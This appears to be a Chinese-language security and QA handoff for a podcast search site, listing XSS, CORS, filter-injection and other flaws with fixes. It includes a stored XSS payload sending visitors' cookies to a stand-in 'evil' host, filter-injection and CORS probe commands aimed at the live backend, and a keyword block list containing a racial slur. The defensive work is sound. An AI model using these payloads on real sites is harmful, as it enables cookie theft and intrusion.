# 新資料庫專案 — Bug 修復交接文件

**對象**：開發 session（人類或 Claude）
**日期**：2026-04-29
**測試輪次**：QA 初測（功能） + 安全審查（純 read-only，無寫入 production）

---

## 給開發 session 的開場白

你即將維護的專案叫「**新資料庫**」（前身：呱吉 Podcast 檢索系統）——對呱吉頻道全部 786 集 Podcast 做轉錄 + 全文檢索的網站。

- **正式網址**：https://sear.newfolderla.com
- **後端 API**：https://backend-production-b729.up.railway.app
- **專案資料夾**：`/Users/weichiehchiu/Claude Apps/guchi-search/`
- **架構文件**：請先讀 `HANDOFF.md`（內含 Railway service 清單、API 列表、Schema、credentials）

### 怎麼讀這份文件

1. **第 0 章 紅線**：先看，避免破壞 production
2. **第 1 章 修補建議順序**：照這個順序動手最有效率
3. **第 2-5 章**：依嚴重度的詳細 bug 列表 + 修法
4. **第 6 章 驗證清單**：每個 fix 該怎麼確認
5. **附錄**：原始 QA 報告路徑、PoC 指令

每一條 bug 都包含：**檔案行號 / 重現步驟 / 為什麼是漏洞 / 具體修法 code / 不要做的修法**。

### 本次發現摘要

| 嚴重度 | 件數 | ID |
|---|---|---|
| 🔴 Critical | 2 | SEC-01, SEC-02 |
| 🟠 High | 4 | SEC-03, SEC-04, SEC-05, SEC-06 |
| 🟡 Medium | 8 | BUG-01, SEC-07~SEC-11, WARN-03, WARN-05 |
| 🟢 Low / Polish | 7 | BUG-02, SEC-12, SEC-13, SEC-14, WARN-01, WARN-02, WARN-04 |
| **合計** | **21** | |

**核心風險（一句話）**：核心搜尋功能對 SQL injection 安全（ORM 都用 bind params），但 stored XSS 鏈 + 公開 admin schema + CORS 反射這三件加起來，攻擊者只需「公開 POST 校對」+「等 admin 不仔細看 diff 批准」就能拿下所有訪客。建議優先修 SEC-01 / SEC-02 / SEC-03。

---

## 第 0 章：紅線（修 bug 過程務必遵守）

### 不可以對 production 做的事
1. 不要送出任何校對表單（`POST /api/corrections`）測試
2. 不要登入 `/admin`（除非真的要驗證 admin 修法）
3. 不要呼叫 `/api/maintenance/*`（觸發實際維護動作，有成本）
4. 不要呼叫 `/api/replace-text`（會改正式資料）
5. 不要對 prod backend 做大量並發測試（會被 Railway 計費 + 影響真實使用者）

### 寫 / 改程式碼時要注意
- 不要 commit 任何含 secret 的檔案（HANDOFF.md 第 60 行的 secret 已經外洩——這是個人專案的決定，但別擴散）
- 任何「會寫入 DB 的修改」**先在本機 dev 環境驗證**（`docker-compose up`）
- 不要為了修 bug 而動到正式 DB schema（Schema 是 lifespan hook 自動建的，加欄位需新模型 + 部署）
- 修完每個 Critical / High bug 後**單獨部署 + 驗證**，不要一次推十個

### 推薦本機開發流程
```bash
cd "/Users/weichiehchiu/Claude Apps/guchi-search"
# 看 docker-compose.yml 確認本機環境
docker-compose up
# Frontend 在 :3000、Backend 在 :8000（請按 docker-compose 實際設定）
```

---

## 第 1 章：修補建議順序

照這個順序最有效率（最少代碼改動、最高 impact、避免打結）：

| 步驟 | Bug | 預估代碼量 | 影響 |
|---|---|---|---|
| 1 | **SEC-01** Stored XSS（後端 _format_hit 加 escape） | ~10 行 | 斷掉整條 stored XSS 鏈，連帶解 SEC-10 |
| 2 | **SEC-02** CORS 反射（cors_origins 改具名清單） | 1 行 config + Railway env | 防禦縱深，未來改 cookie auth 不會炸 |
| 3 | **SEC-03** 關 prod 的 /docs、/redoc、/openapi.json | 3 行 | 移除 attack surface map |
| 4 | **SEC-06** Secret 比對改 secrets.compare_digest | grep + replace ~10 行 | Best practice，防內網 timing |
| 5 | **SEC-07** 補 HTTP 安全 headers | ~30 行 next.config.ts | CSP 是 stored XSS 的最後一道防線 |
| 6 | **SEC-04** show 參數 white-list | ~5 行 search.py | Query language injection |
| 7 | **SEC-05** Admin secret 改 Authorization header | 前後端合計 ~30 行 | Secret 不再進 URL / log / referer |
| 8 | **BUG-01** 搜尋框 input 同步（useEffect） | ~3 行 | UX 修補 |
| 9 | **SEC-08** /api/text-count 拒絕 null byte | ~3 行 | 修掉 cheap DoS |
| 10 | **SEC-09** /api/corrections rate limit + max_length | ~30 行 | DoS / spam 防護 |
| 11 | 其他 Medium / Low 一起 sweep | varies | Polish |

每完成一步，獨立 commit + push + 觀察 ~10 分鐘 prod。

---

## 第 2 章：🔴 Critical（必修）

### SEC-01 [🔴 Critical] Stored XSS：highlighted_text 用 dangerouslySetInnerHTML 渲染、後端不 escape

**檔案**：
- `backend/app/api/search.py:208-218`（後端 `_format_hit`）
- `frontend/src/components/SearchResults.tsx:89, 113`（前端渲染）
- 攻擊鏈起點：`backend/app/api/corrections.py:34-63`（無 auth 的公開 POST `/api/corrections`）

**問題**：
後端把 Meilisearch 回傳的 `_formatted.text`（含 `<mark>` 高亮標籤）當作 `highlighted_text` 直接回傳，**完全不做 HTML escape**。前端 `SearchResults.tsx` 兩處用 `dangerouslySetInnerHTML={{ __html: hit.highlighted_text }}` 渲染。只要 segment 內容含 `<` `>` `"` `'`，瀏覽器就會解析成 HTML/JS。

目前資料庫內容是 Whisper 產出的純逐字稿，**碰巧**沒有 HTML 字元，但攻擊鏈是完整的：

1. 攻擊者打 `POST /api/corrections`（**無需任何 auth**），`suggested_text` 填 `<img src=x onerror="fetch('https://evil/?cookie='+document.cookie)">`，submitter_name 填正常名字
2. 等管理員批次批准（admin 介面顯示 diff，但長句中夾 `<img>` 容易被忽略）
3. 批准後，`approve_correction()`（corrections.py:212-213）把 `suggested_text` 寫進 `Segment.text`，然後 `index_episode_segments()` 把它推進 Meilisearch
4. 之後任何訪客搜到包含這段的關鍵字，瀏覽器就會執行該腳本
5. 訪客的搜尋紀錄、admin 進入 `/admin` 後 React state 裡的 secret（雖不在 cookie，但 admin 在同 tab 切到搜尋頁就會被偷）皆可外洩

**前端 sink PoC（已實證）**：用 Playwright 攔截 `fetch('/api/search')` 回傳偽造 payload，無需動後端：

```javascript
// 在 https://sear.newfolderla.com/ 的 console 跑：
const orig = window.fetch;
window.fetch = async (u, o) => {
  if (typeof u === 'string' && u.includes('/api/search')) {
    return new Response(JSON.stringify({
      query: 'test', total_episodes: 1, total_segment_matches: 1, page: 1, per_page: 20,
      episodes: [{
        episode_id: 1, episode_title: 'XSS PoC', show: '直播', published_at: null,
        is_title_only_match: false, hit_count: 1,
        hits: [{
          segment_id: 1, start_time: 0, end_time: 1, text: 'fake',
          highlighted_text: '<img src=x onerror="document.title=\'XSS\'" />',
          is_title_only: false,
        }],
      }],
    }), { status: 200, headers: { 'Content-Type': 'application/json' } });
  }
  return orig(u, o);
};
// 在搜尋框輸入 test → 按搜尋 → document.title 變成 "XSS"
```

實測截圖：`qa-reports/screenshots/security-round2/sec-xss-poc.png`

**影響**：
- 可竊取所有訪客的 session、cookie、localStorage
- 可竊取 admin 在 `/admin` React state 中的 secret
- 可植入 keylogger、cryptominer、phishing UI
- 攻擊持續存在直到 admin 手動移除

**建議修法（後端 + 前端雙層）**：

#### 後端（首要防線）
`backend/app/api/search.py:208-218` 的 `_format_hit` 把 highlighted 字串做 escape，但保留我們自己注入的 `<mark>` tag：

```python
import html

PRE_TAG = "<mark>"
POST_TAG = "</mark>"
PRE_PLACEHOLDER = "\x00MARK_OPEN\x00"
POST_PLACEHOLDER = "\x00MARK_CLOSE\x00"


def _safe_highlight(formatted_text: str) -> str:
    """Meilisearch returns text with our chosen pre/post tags inserted around
    matches. We need to escape any user content (which can contain < > & "
    via stored corrections or RSS-injected episode_title) but keep our marks."""
    s = formatted_text.replace(PRE_TAG, PRE_PLACEHOLDER).replace(POST_TAG, POST_PLACEHOLDER)
    s = html.escape(s, quote=False)
    s = s.replace(PRE_PLACEHOLDER, PRE_TAG).replace(POST_PLACEHOLDER, POST_TAG)
    return s


def _format_hit(hit):
    raw = hit.get("_formatted", {}).get("text", hit["text"])
    highlighted = _safe_highlight(raw)
    if hit["id"] in neighbors_map:
        prev_t, next_t = neighbors_map[hit["id"]]
        parts = []
        if prev_t:
            parts.append(html.escape(_trim_tail(prev_t, NEIGHBOR_MAX_CHARS), quote=False))
        parts.append(highlighted)
        if next_t:
            parts.append(html.escape(_trim_head(next_t, NEIGHBOR_MAX_CHARS), quote=False))
        highlighted = " ".join(parts)
    # 注意 neighbor text 也要 escape，現在沒做 — 上面已加
    ...
```

#### 前端（防禦縱深）
`SearchResults.tsx` 把 `dangerouslySetInnerHTML` 換成自己 parse：

```tsx
function HighlightedText({ html }: { html: string }) {
  const parts = html.split(/(<mark>|<\/mark>)/);
  let inMark = false;
  return (
    <>
      {parts.map((p, i) => {
        if (p === '<mark>') { inMark = true; return null; }
        if (p === '</mark>') { inMark = false; return null; }
        return inMark ? <mark key={i}>{p}</mark> : <span key={i}>{p}</span>;
      })}
    </>
  );
}
```

**不要做的修法**：
- ❌ **不要只在前端 escape**：後端應該回傳安全的字串
- ❌ **不要用 DOMPurify 套到 dangerouslySetInnerHTML**：DOMPurify 會放行某些 HTML（依 config）
- ❌ **不要在 corrections 入口剝除 `<>`**：會吃掉合法符號，且管不到 RSS 來源

**驗證**：修完後跑 `qa-reports/screenshots/security-round2/sec-xss-poc.png` 對應的 PoC，應該看到 `document.title` 不再變 `XSS`，而是字面顯示 `<img src=x onerror=...>`。

**參考**：OWASP A03:2021 Injection、CWE-79、React docs `dangerouslySetInnerHTML` should NEVER receive untrusted HTML

---

### SEC-02 [🔴 Critical] CORS 反射任意 origin + Allow-Credentials

**檔案**：`backend/app/main.py:37-43`、`backend/app/core/config.py:36`

**問題**：
- `cors_origins: list[str] = ["*"]`（config.py）
- `allow_credentials=True`（main.py:41）
- `allow_methods=["*"]`、`allow_headers=["*"]`

實測：

```bash
$ curl -sI -X OPTIONS \
    -H "Origin: https://evil.example.com" \
    -H "Access-Control-Request-Method: POST" \
    "https://backend-production-b729.up.railway.app/api/corrections"

access-control-allow-credentials: true
access-control-allow-methods: DELETE, GET, HEAD, OPTIONS, PATCH, POST, PUT
access-control-allow-origin: https://evil.example.com    ← 反射！
```

**影響**：
- 任何網站可代訪客送公開的 POST `/api/corrections`（spam）
- 任何網站可讀取所有 GET API 的 response（資料整體爬取無 rate limit）
- **如果未來把 admin auth 改成 cookie / Authorization header**，立刻成為完整 CSRF
- 防禦縱深角度：擋一個是一個

**建議修法**：
`backend/app/core/config.py`：

```python
cors_origins: list[str] = [
    "https://sear.newfolderla.com",
    "http://localhost:3000",  # 開發用，prod env var 蓋掉
]
```

並在 Railway 環境變數設：
```
GUCHI_CORS_ORIGINS=["https://sear.newfolderla.com"]
```
（pydantic-settings 預設用 JSON 解 list）

**不要做的修法**：
- ❌ 不要保留 `*` 同時 `credentials=true`
- ❌ 不要動態反射 Origin header

**驗證**：
```bash
curl -sI -H "Origin: https://evil.example.com" \
  "https://backend-production-b729.up.railway.app/api/stats"
# 預期：access-control-allow-origin 不出現，或為 "https://sear.newfolderla.com"
```

**參考**：OWASP CORS misconfiguration、CWE-942

---

## 第 3 章：🟠 High（短期內修）

### SEC-03 [🟠 High] FastAPI /docs、/redoc、/openapi.json 在 production 公開

**檔案**：`backend/app/main.py:30-35`

**問題**：FastAPI 預設啟用 `/docs`（Swagger UI）、`/redoc`、`/openapi.json`。沒在 production 關掉。

```bash
curl -sI https://backend-production-b729.up.railway.app/docs            # 200
curl -sI https://backend-production-b729.up.railway.app/redoc           # 200
curl -sI https://backend-production-b729.up.railway.app/openapi.json    # 200
```

`/openapi.json` 公開了所有 endpoint（包括 `/api/replace-text`、`/api/maintenance/{action}`、`/api/ingest`、`/api/reindex`、`/api/corrections/batch-approve`）的完整 schema 與 auth header 名稱。

**建議修法**：

```python
import os
ENV = os.getenv("GUCHI_ENV", "production")

app = FastAPI(
    title="新資料庫",
    description="全文檢索呱吉頻道的 Podcast 逐字稿",
    version="1.0.0",
    lifespan=lifespan,
    docs_url="/docs" if ENV == "development" else None,
    redoc_url="/redoc" if ENV == "development" else None,
    openapi_url="/openapi.json" if ENV == "development" else None,
)
```

或最簡單：

```python
app = FastAPI(
    ...,
    docs_url=None,
    redoc_url=None,
    openapi_url=None,
)
```

**驗證**：
```bash
curl -sI https://backend-production-b729.up.railway.app/docs           # 預期 404
curl -sI https://backend-production-b729.up.railway.app/openapi.json   # 預期 404
```

**參考**：CWE-540

---

### SEC-04 [🟠 High] Meilisearch filter 字串注入（show 參數未 escape）

**檔案**：`backend/app/api/search.py:57-59`

```python
filters = []
if show:
    filters.append(f'show = "{show}"')
```

**問題**：`show` query param 直接 f-string 拼進 Meilisearch filter 表達式，沒 escape `"`。攻擊者可塞 `"` 跳出字串字面值、注入任意 filter 子句。

**重現**（已實證）：

```bash
B="https://backend-production-b729.up.railway.app"

# 1. 揭露內部 filterable attribute（錯誤訊息洩漏）
curl -s "$B/api/search?q=test&show=%22%20OR%201%3D1%20OR%20show%20%3D%20%22"
# {"detail":"Search service unavailable: ... invalid_search_filter ...
#  Available filterable attributes are: `episode_id`, `show`, `speaker`. ..."}

# 2. 成功改寫 filter — 強制只出現 episode_id=1
curl -s "$B/api/search?q=the&show=X%22%20OR%20episode_id%20%3D%201%20OR%20show%20%3D%20%22Y" \
  | python3 -c "import json,sys; d=json.load(sys.stdin); print('episodes', d['total_episodes']); print('first_ep', d['episodes'][0]['episode_title'])"
# episodes 1
# first_ep 【呱吉】新資料夾(276)：任何事情都有可能
```

實際送進 Meilisearch 的 filter：`show = "X" OR episode_id = 1 OR show = "Y"` —— 完全跳出原本意圖。

**影響**：
- 目前可篩選 attribute 只有 `episode_id`、`show`、`speaker`，這些資料本來就公開可讀，**資料外洩風險低**
- 但違反 least-privilege；錯誤訊息洩漏內部 schema
- 未來若加 sortable / filterable attributes（校對紀錄、private notes），立即變實質風險

**建議修法**（最推薦：白名單）：

```python
ALLOWED_SHOWS = set(settings.show_keywords.keys()) | {settings.default_show}

@router.get("/search")
async def search(
    q: str = Query(..., min_length=1),
    show: str | None = Query(None),
    ...
):
    if show and show not in ALLOWED_SHOWS:
        raise HTTPException(status_code=400, detail="Invalid show name")
    filters = []
    if show:
        filters.append(f'show = "{show}"')
    ...
```

**不要做的修法**：
- ❌ 只 `replace('"', '')`：`\` 也能跳脫
- ❌ regex 黑名單

**驗證**：
```bash
curl -s "$B/api/search?q=test&show=X%22OR%221%3D1" | grep -E "(detail|400)"
# 預期 400 Invalid show name
```

**參考**：CWE-89（query language injection）

---

### SEC-05 [🟠 High] Admin secret 走 URL query param

**檔案**：
- `backend/app/api/corrections.py:16-21, 153-155, 192-196, 229-233`
- `frontend/src/lib/api.ts:219-227, 229-240, 242-252`

**問題**：管理員 secret 透過 URL query string 傳輸。雖走 HTTPS，但 secret 會落在：
1. Railway / Fastly access log（CDN + backend 兩層）
2. 瀏覽器歷史紀錄、書籤
3. 切換到外部網站時 Referer header 會帶完整 URL（含 secret）
4. backend logger 已會記 request URL

**影響**：Ingest secret 同時也是 admin secret（HANDOFF.md 第 60 行確認）。一旦外洩：
- 透過 `/api/replace-text` **大規模污染整個資料庫**
- 觸發 `/api/maintenance/{action}` 跑各種破壞性指令
- 批次批准任何校對建議（包含 stored XSS payload）

**建議修法**：改用 `Authorization` header。

#### 後端
```python
# corrections.py
from fastapi import Header
import secrets

@router.get("/verify-secret")
async def verify_secret(authorization: str = Header(None)):
    if not authorization or not authorization.startswith("Bearer "):
        raise HTTPException(status_code=403, detail="Invalid secret")
    secret = authorization[len("Bearer "):]
    if not settings.ingest_secret or not secrets.compare_digest(secret, settings.ingest_secret):
        raise HTTPException(status_code=403, detail="Invalid secret")
    return {"status": "ok"}
```

approve / reject / batch-approve 同步改成接 Header。

#### 前端
```typescript
// api.ts
export async function verifySecret(secret: string): Promise<boolean> {
  try {
    const res = await fetchWithRetry(`${API_BASE}/api/corrections/verify-secret`, {
      headers: { Authorization: `Bearer ${secret}` },
    });
    return res.ok;
  } catch {
    return false;
  }
}
```

**不要做的修法**：
- ❌ 不要把 secret 放 path
- ❌ 不要用 cookie 但不設 `SameSite=Strict + Secure + HttpOnly`
- ❌ 不要 base64 encode 假裝隱藏

**參考**：OWASP API2:2023 Broken Authentication、CWE-598

---

### SEC-06 [🟠 High] Secret 比對用 `==`（timing attack，best practice）

**檔案**：
- `backend/app/main.py:76, 102, 131, 154`
- `backend/app/api/corrections.py:19, 161, 201, 238`

**問題**：所有 secret 比對都是 `provided_secret != settings.ingest_secret`（短路比對）。

**現實風險**：在公網 + Railway/Fastly CDN 下 jitter ~150ms 遠大於 ns 級時間差，**遠端不可利用**。但 `secrets.compare_digest()` 是 Python 標準零成本 best practice。

**建議修法**：

```python
import secrets

def _check_secret(provided: str | None) -> bool:
    if not settings.ingest_secret or not provided:
        return False
    return secrets.compare_digest(provided, settings.ingest_secret)


# main.py 所有 if x_ingest_secret != settings.ingest_secret: 改成：
if not _check_secret(x_ingest_secret):
    raise HTTPException(status_code=403, detail="Invalid secret")
```

**不要做的修法**：
- ❌ 不要自己手寫 constant-time 比對

**參考**：CWE-208、Python `secrets.compare_digest`

---

## 第 4 章：🟡 Medium（下個 iteration）

### BUG-01 [🟡 P1] 點熱門關鍵字觸發搜尋後，搜尋框沒同步顯示新關鍵字

**檔案**：`frontend/src/components/SearchBar.tsx`

**重現**：
1. 開 https://sear.newfolderla.com
2. 在搜尋框輸入 `OpenAI` 按搜尋（input 顯示 OpenAI、結果顯示 19 集）
3. 滾到熱門關鍵字區，點「黃國昌」
4. 結果列表切換成「黃國昌 116 集」，但 **input 框仍顯示「OpenAI」**

**影響**：使用者看到「結果是黃國昌」但「框裡寫 OpenAI」；按 Enter 會搜舊字串。

**建議修法**：把 SearchBar 改成 controlled component（query 由 parent 管理），或加 useEffect：

```typescript
useEffect(() => {
  setQuery(initialQuery);
}, [initialQuery]);
```

**回歸 spec**：`qa-reports/regression/bug-search-input-not-synced.spec.ts`（已寫，可整合進 CI）

---

### SEC-07 [🟡 Medium] 缺所有 HTTP 安全 headers

**檔案**：
- `backend/app/main.py`（FastAPI middleware 缺）
- `frontend/next.config.ts`（沒設 `headers()`）

**問題**：實測 frontend 與 backend 完全沒有 HSTS / CSP / X-Frame-Options / X-Content-Type-Options / Referrer-Policy / Permissions-Policy。

**影響**：
- 無 HSTS：第一次 http:// 訪問可被中間人降級
- 無 X-Frame-Options：可被任意網站 iframe 做 clickjacking
- **無 CSP：搭配 SEC-01 stored XSS 沒有 fallback**——CSP 是 stored XSS 的最後一道防線
- 無 Referrer-Policy：搭配 SEC-05 secret-in-URL，admin 切換外部網站時 secret 可能透過 Referer 洩漏

**建議修法**：

#### Frontend `next.config.ts`
```typescript
import type { NextConfig } from "next";

const securityHeaders = [
  { key: 'Strict-Transport-Security', value: 'max-age=63072000; includeSubDomains; preload' },
  { key: 'X-Frame-Options', value: 'DENY' },
  { key: 'X-Content-Type-Options', value: 'nosniff' },
  { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
  { key: 'Permissions-Policy', value: 'camera=(), microphone=(), geolocation=()' },
  // CSP 最後再放 — 需要先測試所有 inline script、Google Fonts、SoundOn audio 都允許
  {
    key: 'Content-Security-Policy',
    value: [
      "default-src 'self'",
      "script-src 'self' 'unsafe-inline'",  // Next.js inline script 需要；長期目標用 nonce
      "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com",
      "font-src 'self' https://fonts.gstatic.com",
      "img-src 'self' data:",
      "media-src https://*.soundon.fm",
      "connect-src 'self' https://backend-production-b729.up.railway.app",
      "frame-ancestors 'none'",
      "base-uri 'self'",
      "form-action 'self'",
    ].join('; '),
  },
];

const nextConfig: NextConfig = {
  output: "standalone",
  poweredByHeader: false,  // 順便修 SEC-14
  async headers() {
    return [{ source: '/:path*', headers: securityHeaders }];
  },
};

export default nextConfig;
```

#### Backend `main.py`
```python
from starlette.middleware.base import BaseHTTPMiddleware

class SecurityHeadersMiddleware(BaseHTTPMiddleware):
    async def dispatch(self, request, call_next):
        response = await call_next(request)
        response.headers["Strict-Transport-Security"] = "max-age=63072000; includeSubDomains"
        response.headers["X-Content-Type-Options"] = "nosniff"
        response.headers["X-Frame-Options"] = "DENY"
        response.headers["Referrer-Policy"] = "no-referrer"
        return response

app.add_middleware(SecurityHeadersMiddleware)
```

**不要做的修法**：
- ❌ 設 CSP 之前先確認所有第三方資源都白名單，不然網站會壞掉
- ❌ `frame-ancestors *` 等於沒設

**驗證**：
```bash
curl -sI "https://sear.newfolderla.com/" | grep -iE "(strict-transport|x-frame|content-security)"
# 預期看到三個 header
```

**參考**：OWASP Secure Headers Project

---

### SEC-08 [🟡 Medium] /api/text-count 對 null byte 回 500

**檔案**：`backend/app/api/search.py:263-275`

**重現**：
```bash
curl -s -D - "https://backend-production-b729.up.railway.app/api/text-count?q=hi%00bye" -o /dev/null
# HTTP/2 500
# body: "Internal Server Error"
```

PostgreSQL TEXT 不能含 null byte，asyncpg 直接 raise，FastAPI 沒接住。

**影響**：cheap DoS，揭露「這個 endpoint 走 DB」內部資訊。

**建議修法**（用 Pydantic validator，所有 q 都套）：

```python
from pydantic import AfterValidator
from typing import Annotated

def _no_null_byte(s: str) -> str:
    if "\x00" in s:
        raise ValueError("Null byte not allowed")
    return s

SearchQuery = Annotated[str, AfterValidator(_no_null_byte)]

@router.get("/search")
async def search(q: SearchQuery = Query(..., min_length=1), ...):
    ...

@router.get("/text-count")
async def text_count(q: SearchQuery = Query(..., min_length=1, max_length=200), ...):
    ...
```

**參考**：CWE-158

---

### SEC-09 [🟡 Medium] 公開 POST /api/corrections 無 rate limit、無 max_length

**檔案**：
- `backend/app/api/corrections.py:34-63`
- `backend/app/models/episode.py:77`（DB column `String(100)`）
- `frontend/src/app/episode/[id]/page.tsx:167-173`（input 沒 maxLength）

**問題**：
1. POST `/api/corrections` 無 auth、無 rate limit、無 CAPTCHA
2. `suggested_text: str` Pydantic 沒 max_length
3. `submitter_name` 沒 max_length，但 DB 是 `String(100)` → 送 >100 字會 500
4. 攻擊者跨不同 segment 可批量 spam（去重只在同一 segment）

**潛在 spam 場景**：~2.5M segments × 1 spam each = 2.5M pending corrections，DB 塞 ~12GB spam，admin 介面爆。

**建議修法**：

#### Pydantic 加限制
```python
from pydantic import BaseModel, Field

class CorrectionSubmit(BaseModel):
    segment_id: int
    suggested_text: str = Field(min_length=1, max_length=2000)
    submitter_name: str = Field(default="匿名", max_length=50)
```

#### 加 rate limit（slowapi）
> ⚠️ 用 slowapi 前先盡職調查（最後 commit、issues）。或用 `fastapi-limiter`（Redis backed，但 Railway 沒 Redis 會增加成本）。最簡單：自刻 in-memory dict + timestamp 限速器，足夠擋腳本兒童。

```python
from slowapi import Limiter
from slowapi.util import get_remote_address

limiter = Limiter(key_func=get_remote_address)
app.state.limiter = limiter

@router.post("")
@limiter.limit("5/minute")
async def submit_correction(request: Request, body: CorrectionSubmit, ...):
    ...
```

#### Frontend 加 maxLength
```tsx
// episode/[id]/page.tsx:167-173
<input
  id="submitter-name"
  type="text"
  value={submitterName}
  onChange={(e) => setSubmitterName(e.target.value)}
  placeholder="匿名"
  maxLength={50}
/>
```

**不要做的修法**：
- ❌ 鎖 IP（誤殺 NAT 後同 IP 多人）

**參考**：CWE-770

---

### SEC-10 [🟡 Medium] RSS 抓進來的 episode_title / description 未 sanitize

**檔案**：
- `backend/app/services/rss_parser.py:62-65`
- `backend/app/scripts/ingest.py:53`
- `backend/app/services/indexer.py:22`

**問題**：episode_title 進 Meilisearch index，目前 `attributesToHighlight` 只設 `text`，所以 title 內的 HTML 不會走進 dangerouslySetInnerHTML——**目前安全，但脆弱**。一旦 `attributesToHighlight` 加上 `episode_title`，立刻爆。

**建議修法**：跟 SEC-01 同一招——在後端 `_format_hit` 統一 escape，無論來自 text 還是 episode_title。**修完 SEC-01 自動解此 bug**。

雙重保險（可選）：`rss_parser.py` 把 title/description `html.escape()`：
```python
import html
title = html.escape(entry.get("title", ""), quote=False)
description = html.escape(entry.get("summary", ""), quote=False)
```
（但會讓 description 顯示「`&lt;a href=...&gt;`」更醜——產品決策）

**參考**：CWE-79

---

### SEC-11 [🟡 Medium] /api/replace-text 無 dry-run、無 confirm、可寫 HTML 字元

**檔案**：
- `backend/app/main.py:109-119, 145-158`
- `backend/app/scripts/ingest.py:282-291`

**問題**：subprocess 用 list-form（無 shell injection），ORM 用 bind params（無 SQL injection），單獨看安全。但：
- 直接把 user-controlled text 寫進 ~2.5M segments 的 text 欄位
- 沒 dry-run、沒結果預覽、沒 size cap、沒 confirmation
- 配合 SEC-05（secret 洩漏）+ SEC-01（前端 dangerouslySetInnerHTML）→ game over

**建議修法**：

```python
class ReplaceTextRequest(BaseModel):
    old_text: str = Field(min_length=1, max_length=100)
    new_text: str = Field(min_length=0, max_length=100)
    dry_run: bool = True  # 預設 dry-run, 必須明確 false 才真改
    confirm_token: str | None = None  # dry-run 後得到的 token

    @field_validator("new_text")
    @classmethod
    def reject_html(cls, v: str) -> str:
        if any(c in v for c in "<>\"'&"):
            raise ValueError("HTML special characters not allowed")
        return v
```

dry-run mode 改 `ingest.py` 回傳「會改的 segment 數量 + 5 個範例」+ 一個 token，真改時帶 token。

**參考**：CWE-345

---

### WARN-03 已併入 SEC-01（同個漏洞，不重複處理）

### WARN-05 [🟡 a11y 中] 校對鉛筆按鈕只在 hover 時可見

**檔案**：`frontend/src/app/episode/[id]/page.tsx`、`frontend/src/app/globals.css` 的 `.nrk-line__edit`

**問題**：`.nrk-line__edit` 預設 `opacity: 0` / hover 顯示。鍵盤使用者（Tab 進來）和觸控使用者看不到。

**建議修法**：focus 時也讓它顯示：

```css
.nrk-line:hover .nrk-line__edit,
.nrk-line:focus-within .nrk-line__edit {
  opacity: 1;
}
```

或直接 always visible 配淺色。

---

## 第 5 章：🟢 Low / Polish

### BUG-02 [🟢 P2] 簡體字 query 找不到資料庫內已轉繁的內容

**檔案**：`backend/app/api/search.py`

**問題**：`电脑` 2 集 vs `電腦` 393 集（差 196 倍）。資料已 OpenCC s2t 為繁體，但 query 沒做。

**建議修法**：在送 Meilisearch 前對 query 套 `opencc.OpenCC('s2t')`：
```python
import opencc
_s2t = opencc.OpenCC('s2t')

@router.get("/search")
async def search(q: SearchQuery, ...):
    q = _s2t.convert(q)
    ...
```
（可能要決定是否同時 fallback 用原 query 搜——產品決策）

**回歸 spec**：`qa-reports/regression/bug-simplified-chinese-search.spec.ts`

---

### SEC-12 [🟢 Low] /api/replace-text、/api/corrections/batch-approve 先驗 body 才驗 secret

**檔案**：`backend/app/main.py:145-158`、`backend/app/api/corrections.py:152-162`

**問題**：FastAPI dep injection 順序：先解析 body，再進 function 內檢查 secret。所以無 auth + 無 body 回 422 而非 403，攻擊者可從回應碼推斷 endpoint 存在。

**建議修法**：用 APIRouter dependency：

```python
async def require_secret(x_ingest_secret: str = Header(None)):
    if not _check_secret(x_ingest_secret):
        raise HTTPException(status_code=403, detail="Invalid secret")
    return True

admin_router = APIRouter(dependencies=[Depends(require_secret)])

@admin_router.post("/api/replace-text")
async def replace_text(body: ReplaceTextRequest, ...):
    ...

app.include_router(admin_router)
```

**參考**：CWE-204

---

### SEC-13 [🟢 Low] popular-keywords 內容濫用

**檔案**：`backend/app/api/search.py:278-297` + `frontend/src/app/page.tsx:166-178`

**問題**：首頁顯示的「7 日熱門」目前已被人灌入 `nigger`、`大便`、`色情` 等明顯灌水關鍵字。React `{k.keyword}` 會 escape，**沒有 XSS 風險**，但是內容品質 / 形象問題。

**建議修法**（最低成本：dedup + 黑名單 + 最小長度）：

```python
from datetime import timedelta

DEDUP_WINDOW = timedelta(minutes=5)
BANNED_KEYWORDS = {"nigger", "大便", "色情", "放屁", ...}  # 整理一份
MIN_KEYWORD_LEN = 3

async def _log_search_query(query: str) -> None:
    normalized = (query or "").strip()
    if len(normalized) < MIN_KEYWORD_LEN:
        return
    if normalized.lower() in BANNED_KEYWORDS:
        return
    try:
        async with async_session() as session:
            since = datetime.utcnow() - DEDUP_WINDOW
            existing = await session.execute(
                select(SearchLog.id)
                .where(SearchLog.query == normalized)
                .where(SearchLog.created_at >= since)
                .limit(1)
            )
            if existing.scalar_one_or_none():
                return
            session.add(SearchLog(query=normalized))
            await session.commit()
    except Exception:
        pass
```

進階：admin 介面加「隱藏不雅關鍵字」按鈕（在 search_logs 表加 `is_hidden: bool`）。

**清理現有資料庫的灌水紀錄**（一次性，請手動跑）：
```sql
DELETE FROM search_logs WHERE query IN ('nigger', '大便', ...);
```

**不要做的修法**：
- ❌ 關掉 popular-keywords（它是好功能）
- ❌ 靠前端過濾（curl 直接打 backend 還是看得到）

**參考**：CWE-841

---

### SEC-14 [🟢 Low] x-powered-by: Next.js 指紋洩漏

**檔案**：`frontend/next.config.ts`

**修法**：（已併入 SEC-07 的 next.config.ts 範例）
```typescript
poweredByHeader: false,
```

---

### WARN-01 [🟢 Low] favicon.ico 404

進首頁就有 1 條 console error：`GET /favicon.ico 404`。

**建議**：放一個 favicon 到 `frontend/public/favicon.ico`，或在 `app/layout.tsx` 設 `metadata.icons` 把 console 清掉。

---

### WARN-02 [🟢 Low] Hero 統計文字 spacing

**檔案**：`frontend/src/app/page.tsx:151-153`

「792 集已轉錄　·2,521,334 段文字可搜尋」中間 `·` 與後方數字間沒空格（半形點貼著數字）。視覺略不對稱。

---

### WARN-04 [🟢 Low] 部分集數搜尋結果無日期顯示

**檔案**：`backend/app/services/rss_parser.py`

「呱吉」搜尋第 8 個結果（直播 8 處 大家好我是呱吉喔）卡片中沒顯示日期。可能該集 `published_at` 是 null。建議檢查 RSS 缺日期時的 fallback（用 first_seen 或目前時間？產品決策）。

---

## 第 6 章：驗證清單

每個 fix 修完後對應驗證指令／步驟：

| Bug | 驗證方式 |
|---|---|
| SEC-01 | 開 console 跑 PoC fetch override，`document.title` 不變 `XSS`；前端應顯示 `<img>` 字面 |
